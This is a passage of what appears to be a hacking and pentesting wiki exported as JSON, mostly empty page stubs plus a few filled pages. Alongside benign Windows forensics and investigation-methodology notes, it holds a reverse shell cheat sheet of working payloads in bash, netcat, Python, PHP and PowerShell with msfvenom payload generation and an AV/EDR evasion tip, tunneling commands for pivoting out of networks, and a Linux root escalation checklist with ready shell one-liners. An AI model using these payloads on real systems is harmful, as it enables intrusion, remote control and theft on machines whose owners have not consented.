       "content": "# Windows Forensic Artifacts\n\n## Core Artifact Map\n| Artifact | Location | Reveals |\n|---|---|---|\n| Registry hives | `SYSTEM`, `SOFTWARE`, `SAM`, `SECURITY`, `NTUSER.DAT` | Installed software, USB history, user activity, account info |\n| Prefetch | `C:\\Windows\\Prefetch\\*.pf` | Program execution history + run count + last-run time |\n| Amcache | `C:\\Windows\\AppCompat\\Programs\\Amcache.hve` | Executed binaries, even after deletion, with SHA1 hashes |\n| ShimCache/AppCompatCache | Inside `SYSTEM` hive | Evidence of file execution (contested — presence isn't 100% proof of execution) |\n| Event Logs | `C:\\Windows\\System32\\winevt\\Logs\\*.evtx` | Logins (4624/4625), process creation (4688), service installs (7045) |\n| Recycle Bin | `$Recycle.Bin\\<SID>\\` | Deleted files with original path + delete timestamp via `$I` files |\n| LNK files | `%APPDATA%\\Microsoft\\Windows\\Recent\\` | Recently accessed files, even from removable media |\n| Jump Lists | `%APPDATA%\\...\\AutomaticDestinations\\` | App-specific recent file/target history |\n\n## Key Event IDs to Filter On\n- **4624/4625** — successful/failed logon (check Logon Type: 3 = network, 10 = RDP)\n- **4688** — process creation (enable command-line auditing to get full command args)\n- **4720** — user account created\n- **7045** — new service installed (classic persistence indicator)\n- **1102** — audit log cleared (huge red flag — attacker covering tracks)\n\n## Registry Highlights\n- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU` — typed commands in Run dialog.\n- `SYSTEM\\CurrentControlSet\\Enum\\USBSTOR` — USB device history.\n- `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` (and `RunOnce`) — classic autorun persistence location.\n\n## Volume Shadow Copies\n- Often overlooked source of historical file state. List and mount with `vssadmin list shadows` (live system) or carve from an image with tools like `vshadowmount`.\n\n## Quick Triage Workflow\n1. Pull registry hives + key `.evtx` logs + Prefetch + Amcache via a triage tool (KAPE, or manual `robocopy` with `/b`).\n2. Build a timeline correlating process creation (4688) with Prefetch last-run and file-system MACB times.\n3. Cross-reference any suspicious binary hash against Amcache/ShimCache to establish first-seen time.",
       "status": "complete",
       "updated": "2026-07-10"
      }
     ],
     "tag": "TAG-0033",
     "content": "# Digital Forensics Methodology\n\nCore process for any forensic investigation, regardless of the specific artifact type involved.\n\n## 1. Preparation\n- Confirm legal authority to investigate (warrant, company policy, incident-response retainer).\n- Prepare write-blockers, sterile/wiped storage for images, and a chain-of-custody form template before touching evidence.\n\n## 2. Identification\n- Identify all potential evidence sources: disks, RAM, network logs, cloud service logs, mobile devices, removable media.\n- Photograph the scene/device state before any interaction if this is a physical seizure.\n\n## 3. Preservation (Chain of Custody)\n- Every person who touches the evidence, every timestamp, every transfer — logged. This is what makes evidence admissible later.\n- Hash everything immediately after acquisition (MD5 *and* SHA256 — MD5 for legacy tool compatibility, SHA256 for integrity going forward).\n\n```bash\nsha256sum evidence.dd > evidence.dd.sha256\nmd5sum evidence.dd > evidence.dd.md5\n```\n\n## 4. Acquisition\n- **Disk**: bit-for-bit image via `dd`/`dc3dd`/FTK Imager, never work on the original.\n```bash\ndc3dd if=/dev/sdb of=evidence.dd hash=sha256 log=acquisition.log\n```\n- **RAM**: acquire *before* disk if the machine is live — RAM is far more volatile (order of volatility: registers → cache → RAM → disk → backups). Tools: `WinPmem`, `LiME` (Linux), `Magnet RAM Capture`.\n- **Network**: pull relevant firewall/proxy/NetFlow logs and any full-packet-capture available for the incident window.\n\n## 5. Analysis\n- Work only on a verified copy (re-hash after imaging, compare to original hash).\n- Build a timeline — file MACB (Modify/Access/Change/Birth) timestamps, log timestamps, registry timestamps, all normalized to one timezone (UTC recommended).\n- Look for the \"patient zero\": initial access vector, then trace lateral movement / persistence outward from there.\n\n## 6. Documentation & Reporting\n- Every finding needs: what you found, where, how you found it (tool + version), and why it matters.\n- Write for two audiences simultaneously: a technical appendix or another examiner could reproduce your steps, and an executive summary a non-technical stakeholder can act on.\n\n## Order of Volatility (memorize this)\n1. CPU registers, cache\n2. RAM (routing table, ARP cache, process table, kernel stats)\n3. Network state\n4. Running processes\n5. Disk\n6. Remote logging/monitoring data\n7. Physical configuration/network topology\n8. Archival media/backups\n\n## Common Pitfalls\n- Booting the original suspect disk before imaging (alters timestamps).\n- Analyzing on the live/original evidence instead of a working copy.\n- Forgetting timezone normalization — a timeline built from mismatched timezones will send you chasing ghosts.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Python Sandbox Escape & Pyscript",
     "slug": "python-sandbox-escape-pyscript",
     "type": "page",
     "children": [
      {
       "title": "Bypass Python sandboxes",
       "slug": "bypass-python-sandboxes",
       "type": "page",
       "children": [
        {
         "title": "Js2py Sandbox Escape Cve 2024 28397",
         "slug": "js2py-sandbox-escape-cve-2024-28397",
         "type": "page",
         "children": [],
         "tag": "TAG-0071",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "LOAD_NAME / LOAD_CONST opcode OOB Read",
         "slug": "loadname-loadconst-opcode-oob-read",
         "type": "page",
         "children": [],
         "tag": "TAG-0072",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Reportlab Xhtml2pdf Triple Brackets Expression Evaluation Rce Cve 2023 33733",
         "slug": "reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rc",
         "type": "page",
         "children": [],
         "tag": "TAG-0073",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0070",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Class Pollution (Python's Prototype Pollution)",
       "slug": "class-pollution-pythons-prototype-pollution",
       "type": "page",
       "children": [],
       "tag": "TAG-0074",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Keras Model Deserialization Rce And Gadget Hunting",
       "slug": "keras-model-deserialization-rce-and-gadget-hunting",
       "type": "page",
       "children": [],
       "tag": "TAG-0075",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Python Internal Read Gadgets",
       "slug": "python-internal-read-gadgets",
       "type": "page",
       "children": [],
       "tag": "TAG-0076",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Pyscript",
       "slug": "pyscript",
       "type": "page",
       "children": [],
       "tag": "TAG-0077",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "venv",
       "slug": "venv",
       "type": "page",
       "children": [],
       "tag": "TAG-0078",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Web Requests",
       "slug": "web-requests",
       "type": "page",
       "children": [],
       "tag": "TAG-0079",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Bruteforce hash (few chars)",
       "slug": "bruteforce-hash-few-chars",
       "type": "page",
       "children": [],
       "tag": "TAG-0080",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Basic Python",
       "slug": "basic-python",
       "type": "page",
       "children": [],
       "tag": "TAG-0081",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0069",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Side Channel Attacks On Messaging Protocols",
     "slug": "side-channel-attacks-on-messaging-protocols",
     "type": "page",
     "children": [],
     "tag": "TAG-0082",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Threat Modeling",
     "slug": "threat-modeling",
     "type": "page",
     "children": [],
     "tag": "TAG-0083",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Blockchain & Crypto",
     "slug": "blockchain-crypto",
     "type": "page",
     "children": [
      {
       "title": "Defi/AMM Hook Precision",
       "slug": "defiamm-hook-precision",
       "type": "page",
       "children": [],
       "tag": "TAG-0085",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Defi Amm Virtual Balance Cache Exploitation",
       "slug": "defi-amm-virtual-balance-cache-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0086",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Mutation Testing With Slither",
       "slug": "mutation-testing-with-slither",
       "type": "page",
       "children": [],
       "tag": "TAG-0087",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Erc 4337 Smart Account Security Pitfalls",
       "slug": "erc-4337-smart-account-security-pitfalls",
       "type": "page",
       "children": [],
       "tag": "TAG-0088",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Value Centric Web3 Red Teaming",
       "slug": "value-centric-web3-red-teaming",
       "type": "page",
       "children": [],
       "tag": "TAG-0089",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Web3 Signing Workflow Compromise Safe Delegatecall Proxy Takeover",
       "slug": "web3-signing-workflow-compromise-safe-delegatecall-proxy-tak",
       "type": "page",
       "children": [],
       "tag": "TAG-0090",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0084",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Lua Sandbox Escape",
     "slug": "lua-sandbox-escape",
     "type": "page",
     "children": [],
     "tag": "TAG-0091",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#E8B04B"
  },
  {
   "title": "🧙‍♂️ Generic Hacking",
   "slug": "generic-hacking",
   "type": "category",
   "children": [
    {
     "title": "Archive Extraction Path Traversal",
     "slug": "archive-extraction-path-traversal",
     "type": "page",
     "children": [],
     "tag": "TAG-0092",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Brute Force - CheatSheet",
     "slug": "brute-force---cheatsheet",
     "type": "page",
     "children": [],
     "tag": "TAG-0093",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Esim Javacard Exploitation",
     "slug": "esim-javacard-exploitation",
     "type": "page",
     "children": [],
     "tag": "TAG-0094",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Exfiltration",
     "slug": "exfiltration",
     "type": "page",
     "children": [],
     "tag": "TAG-0095",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Reverse Shells (Linux, Windows, MSFVenom)",
     "slug": "reverse-shells-linux-windows-msfvenom",
     "type": "page",
     "children": [
      {
       "title": "MSFVenom - CheatSheet",
       "slug": "msfvenom---cheatsheet",
       "type": "page",
       "children": [],
       "tag": "TAG-0097",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Reverse Shells - Windows",
       "slug": "reverse-shells---windows",
       "type": "page",
       "children": [],
       "tag": "TAG-0098",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Reverse Shells - Linux",
       "slug": "reverse-shells---linux",
       "type": "page",
       "children": [],
       "tag": "TAG-0099",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Expose local to the internet",
       "slug": "expose-local-to-the-internet",
       "type": "page",
       "children": [],
       "tag": "TAG-0100",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Full TTYs",
       "slug": "full-ttys",
       "type": "page",
       "children": [],
       "tag": "TAG-0101",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0096",
     "content": "# Reverse Shell Cheat Sheet\n\nStart a listener first: `nc -lvnp 4444`\n\n## Linux / Bash\n```bash\nbash -i >& /dev/tcp/<ip>/4444 0>&1\n```\n\n## Netcat variants\n```bash\nnc -e /bin/sh <ip> 4444                          # if nc has -e compiled in\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 4444 >/tmp/f   # no -e needed\n```\n\n## Python\n```bash\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n```\n\n## PHP\n```php\nphp -r '$sock=fsockopen(\"<ip>\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```\n\n## PowerShell (Windows)\n```powershell\npowershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<ip>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\"\n```\n\n## MSFVenom Payload Generation\n```bash\n# Windows exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe\n\n# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf\n\n# PHP web shell\nmsfvenom -p php/reverse_php LHOST=<ip> LPORT=4444 -f raw -o shell.php\n\n# Staged Meterpreter (Windows)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o met.exe\n```\nMatching handler: `msfconsole -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; run\"`\n\n## Upgrading a Dumb Shell to a Full TTY\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n# Ctrl+Z then on your attacker machine:\nstty raw -echo; fg\n# then in the shell:\nreset\n```\n\n## Common Pitfalls\n- Firewall may block outbound on common ports — try 443/80 first, they're rarely blocked outbound.\n- AV/EDR will flag `msfvenom` default payloads almost instantly on modern endpoints — encoding alone (`-e`) rarely helps anymore; custom payloads or living-off-the-land binaries are far more reliable.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Search Exploits",
     "slug": "search-exploits",
     "type": "page",
     "children": [],
     "tag": "TAG-0102",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Tunneling and Port Forwarding",
     "slug": "tunneling-and-port-forwarding",
     "type": "page",
     "children": [],
     "tag": "TAG-0103",
     "content": "# Tunneling & Port Forwarding\n\n## SSH Local Port Forward (access a remote-only service from your machine)\n```bash\nssh -L 8080:internal-host:80 user@pivot-box\n# now localhost:8080 on your machine reaches internal-host:80\n```\n\n## SSH Remote Port Forward (expose your machine to a target that can't reach you directly)\n```bash\nssh -R 4444:localhost:4444 user@pivot-box\n```\n\n## SSH Dynamic Port Forward (SOCKS proxy — full pivot)\n```bash\nssh -D 1080 user@pivot-box\n# then route tools through it:\nproxychains nmap -sT -Pn 10.10.10.0/24\n```\nAdd `socks4 127.0.0.1 1080` to `/etc/proxychains.conf`.\n\n## Chisel (when SSH isn't available on the pivot)\n```bash\n# attacker (server)\n./chisel server -p 8000 --reverse\n\n# victim/pivot (client)\n./chisel client <attacker-ip>:8000 R:1080:socks\n# then proxychains through 127.0.0.1:1080 as above\n```\n\n## Ligolo-ng (modern tunneling, creates a virtual interface — cleaner than SOCKS for full subnet access)\n```bash\n# attacker\n./proxy -selfcert\n# agent on pivot\n./agent -connect <attacker-ip>:11601 -ignore-cert\n# then in proxy console: session, then start, then add a route to the new tun interface\n```\n\n## Plink (Windows pivot, no SSH client installed)\n```powershell\nplink.exe -ssh -D 1080 user@attacker-ip\n```\n\n## When Everything Is Blocked: DNS/ICMP Tunneling\n- `dnscat2` or `iodine` for DNS tunneling when only DNS egress is allowed.\n- `ptunnel` for ICMP tunneling when only ping is allowed outbound.\n\n## Practical Order of Preference\n1. SSH (if available on the pivot) — reliable, encrypted, no extra binaries.\n2. Chisel/Ligolo — when you need to drop a static binary but no SSH.\n3. DNS/ICMP tunneling — last resort, very slow, but works when everything else is filtered.",
     "status": "complete",
     "updated": "2026-07-10"
    }
   ],
   "color": "#C77DFF"
  },
  {
   "title": "🐧 Linux Hardening",
   "slug": "linux-hardening",
   "type": "category",
   "children": [
    {
     "title": "Linux Basics",
     "slug": "linux-basics",
     "type": "page",
     "children": [],
     "tag": "TAG-0104",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Checklist - Linux Privilege Escalation",
     "slug": "checklist---linux-privilege-escalation",
     "type": "page",
     "children": [],
     "tag": "TAG-0105",
     "content": "# Linux Privilege Escalation Checklist\n\nWork through this roughly top-to-bottom; the easy wins are near the top.\n\n## System Info\n```bash\nuname -a; cat /etc/os-release\nsudo -l                        # what can this user run as root, without a password?\nid; groups\n```\n\n## Automated Enumeration (run these first, review manually after)\n```bash\n./linpeas.sh\n./linux-smart-enumeration.sh\n```\n\n## Manual Checks\n- [ ] `sudo -l` output — any binary listed here can often be abused via [GTFOBins](https://gtfobins.github.io)\n- [ ] SUID/SGID binaries: `find / -perm -4000 -o -perm -2000 2>/dev/null`\n- [ ] Writable `/etc/passwd` or `/etc/shadow`? → add a root UID-0 user directly\n- [ ] Cron jobs running as root that call a world-writable script: `cat /etc/crontab; ls -la /etc/cron.*`\n- [ ] Capabilities on binaries: `getcap -r / 2>/dev/null` (e.g., `cap_setuid+ep` on a binary = instant root)\n- [ ] Kernel version — any known local privesc CVE for this exact version?\n- [ ] Docker group membership (`docker` group = root-equivalent via container mount escape)\n- [ ] NFS exports with `no_root_squash`\n- [ ] World-writable files owned by root, especially scripts referenced by services/cron\n- [ ] Environment variables / `PATH` hijacking opportunities in scripts run by root\n- [ ] Password reuse — check config files, `.bash_history`, backup files for plaintext creds\n\n## Quick Wins Table\n| Finding | Exploit approach |\n|---|---|\n| `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/vim` | GTFOBins: `sudo vim -c ':!/bin/sh'` |\n| SUID on `find` | `find . -exec /bin/sh -p \\; -quit` |\n| Writable `/etc/passwd` | `openssl passwd -1 -salt x pass` → append new root user line |\n| Cron running world-writable script as root | Append reverse shell payload to the script |\n| Capability `cap_setuid+ep` on python | `python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'` |\n\n## Kernel Exploits (last resort)\nOnly after the above is exhausted — kernel exploits can crash the box. Check `searchsploit` and CVE databases against the exact `uname -r` output.",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Linux Privilege Escalation",
     "slug": "linux-privilege-escalation",
     "type": "page",
     "children": [
      {
       "title": "Android Rooting Frameworks Manager Auth Bypass Syscall Hook",
       "slug": "android-rooting-frameworks-manager-auth-bypass-syscall-hook",
       "type": "page",
       "children": [],
       "tag": "TAG-0107",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Vmware Tools Service Discovery Untrusted Search Path Cve 2025 41244",
       "slug": "vmware-tools-service-discovery-untrusted-search-path-cve-202",
       "type": "page",
       "children": [],
       "tag": "TAG-0108",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Arbitrary File Write to Root",
       "slug": "arbitrary-file-write-to-root",
       "type": "page",
       "children": [],
       "tag": "TAG-0109",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Cisco - vmanage",
       "slug": "cisco---vmanage",
       "type": "page",
       "children": [],
       "tag": "TAG-0110",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Containerd (ctr) Privilege Escalation",
       "slug": "containerd-ctr-privilege-escalation",
       "type": "page",
       "children": [],
       "tag": "TAG-0111",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "D-Bus Enumeration & Command Injection Privilege Escalation",
       "slug": "d-bus-enumeration-command-injection-privilege-escalation",
       "type": "page",
       "children": [],
       "tag": "TAG-0112",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Container Security",
       "slug": "container-security",
       "type": "page",
       "children": [
        {
         "title": "Runtimes And Engines",
         "slug": "runtimes-and-engines",
         "type": "page",
         "children": [],
         "tag": "TAG-0114",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Runtime API And Daemon Exposure",
         "slug": "runtime-api-and-daemon-exposure",
         "type": "page",
         "children": [],
         "tag": "TAG-0115",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Authorization Plugins",
         "slug": "authorization-plugins",
         "type": "page",
         "children": [],
         "tag": "TAG-0116",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Image Security And Secrets",
         "slug": "image-security-and-secrets",
         "type": "page",
         "children": [],
         "tag": "TAG-0117",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Assessment And Hardening",
         "slug": "assessment-and-hardening",
         "type": "page",
         "children": [],
         "tag": "TAG-0118",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Sensitive Host Mounts",
         "slug": "sensitive-host-mounts",
         "type": "page",
         "children": [],
         "tag": "TAG-0119",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Privileged Containers",
         "slug": "privileged-containers",
         "type": "page",
         "children": [],
         "tag": "TAG-0120",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Distroless",
         "slug": "distroless",
         "type": "page",
         "children": [],
         "tag": "TAG-0121",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Protections",
         "slug": "protections",
         "type": "page",
         "children": [
          {
           "title": "AppArmor",
           "slug": "apparmor",
           "type": "page",
           "children": [],
           "tag": "TAG-0123",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "Capabilities",
           "slug": "capabilities",
           "type": "page",
           "children": [],
           "tag": "TAG-0124",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "CGroups",
           "slug": "cgroups",
           "type": "page",
           "children": [],
           "tag": "TAG-0125",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "Masked Paths",
           "slug": "masked-paths",
           "type": "page",
           "children": [],
           "tag": "TAG-0126",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "No New Privileges",
           "slug": "no-new-privileges",
           "type": "page",
           "children": [],
           "tag": "TAG-0127",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "Read Only Paths",
           "slug": "read-only-paths",
           "type": "page",
           "children": [],
           "tag": "TAG-0128",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "Seccomp",
           "slug": "seccomp",
           "type": "page",
           "children": [],
           "tag": "TAG-0129",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "SELinux",
           "slug": "selinux",
           "type": "page",
           "children": [],
           "tag": "TAG-0130",
           "content": "",
           "status": "empty",
           "updated": null
          },
          {
           "title": "Namespaces",
           "slug": "namespaces",
           "type": "page",
           "children": [
            {
             "title": "CGroup Namespace",
             "slug": "cgroup-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0132",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "IPC Namespace",
             "slug": "ipc-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0133",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "PID Namespace",
             "slug": "pid-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0134",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "Mount Namespace",
             "slug": "mount-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0135",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "Network Namespace",
             "slug": "network-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0136",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "Time Namespace",
             "slug": "time-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0137",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "User Namespace",
             "slug": "user-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0138",
             "content": "",
             "status": "empty",
             "updated": null
            },
            {
             "title": "UTS Namespace",
             "slug": "uts-namespace",
             "type": "page",
             "children": [],
             "tag": "TAG-0139",
             "content": "",
             "status": "empty",
             "updated": null
            }
           ],
           "tag": "TAG-0131",
           "content": "",
           "status": "empty",
           "updated": null
          }
         ],
         "tag": "TAG-0122",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0113",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Escaping from Jails",
       "slug": "escaping-from-jails",
       "type": "page",
       "children": [],
       "tag": "TAG-0140",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Copy Fail Af Alg Splice Page Cache Overwrite Cve 2026 31431",
       "slug": "copy-fail-af-alg-splice-page-cache-overwrite-cve-2026-31431",
       "type": "page",
       "children": [],
       "tag": "TAG-0141",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Posix Cpu Timers Toctou Cve 2025 38352",
       "slug": "posix-cpu-timers-toctou-cve-2025-38352",
       "type": "page",
       "children": [],
       "tag": "TAG-0142",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Linux Ptrace Exit Race Pidfd Getfd Fd Theft",
       "slug": "linux-ptrace-exit-race-pidfd-getfd-fd-theft",
       "type": "page",
       "children": [],
       "tag": "TAG-0143",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "euid, ruid, suid",
       "slug": "euid-ruid-suid",
       "type": "page",
       "children": [],
       "tag": "TAG-0144",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Interesting Groups - Linux Privesc",
       "slug": "interesting-groups---linux-privesc",
       "type": "page",
       "children": [
        {
         "title": "lxd/lxc Group - Privilege escalation",
         "slug": "lxdlxc-group---privilege-escalation",
         "type": "page",
         "children": [],
         "tag": "TAG-0146",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0145",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Logstash",
       "slug": "logstash",
       "type": "page",
       "children": [],
       "tag": "TAG-0147",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ld.so privesc exploit example",
       "slug": "ldso-privesc-exploit-example",
       "type": "page",
       "children": [],
       "tag": "TAG-0148",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Linux Active Directory",
       "slug": "linux-active-directory",
       "type": "page",
       "children": [],
       "tag": "TAG-0149",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Linux Capabilities",
       "slug": "linux-capabilities",
       "type": "page",
       "children": [],
       "tag": "TAG-0150",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "NFS no_root_squash/no_all_squash misconfiguration PE",
       "slug": "nfs-norootsquashnoallsquash-misconfiguration-pe",
       "type": "page",
       "children": [],
       "tag": "TAG-0151",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Node inspector/CEF debug abuse",
       "slug": "node-inspectorcef-debug-abuse",
       "type": "page",
       "children": [],
       "tag": "TAG-0152",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Payloads to execute",
       "slug": "payloads-to-execute",
       "type": "page",
       "children": [],
       "tag": "TAG-0153",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "RunC Privilege Escalation",
       "slug": "runc-privilege-escalation",
       "type": "page",
       "children": [],
       "tag": "TAG-0154",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SELinux",
       "slug": "selinux-2",
       "type": "page",
       "children": [],
       "tag": "TAG-0155",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Socket Command Injection",
       "slug": "socket-command-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0156",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Splunk LPE and Persistence",
       "slug": "splunk-lpe-and-persistence",
       "type": "page",
       "children": [],
       "tag": "TAG-0157",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SSH Forward Agent exploitation",
       "slug": "ssh-forward-agent-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0158",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Wildcards Spare tricks",
       "slug": "wildcards-spare-tricks",
       "type": "page",
       "children": [],
       "tag": "TAG-0159",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0106",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Useful Linux Commands",
     "slug": "useful-linux-commands",
     "type": "page",
     "children": [],
     "tag": "TAG-0160",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Bypass Linux Restrictions",
     "slug": "bypass-linux-restrictions",
     "type": "page",
     "children": [
      {
       "title": "Bypass FS protections: read-only / no-exec / Distroless",
       "slug": "bypass-fs-protections-read-only-no-exec-distroless",
       "type": "page",
       "children": [
        {
         "title": "DDexec / EverythingExec",
         "slug": "ddexec-everythingexec",
         "type": "page",
         "children": [],
         "tag": "TAG-0163",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0162",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0161",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Linux Environment Variables",
     "slug": "linux-environment-variables",
     "type": "page",
     "children": [],
     "tag": "TAG-0164",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Linux Post-Exploitation",
     "slug": "linux-post-exploitation",
     "type": "page",
     "children": [
      {
       "title": "PAM - Pluggable Authentication Modules",
       "slug": "pam---pluggable-authentication-modules",
       "type": "page",
       "children": [],
       "tag": "TAG-0166",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0165",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "FreeIPA Pentesting",
     "slug": "freeipa-pentesting",
     "type": "page",
     "children": [],
     "tag": "TAG-0167",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#5FD068"
  },
  {
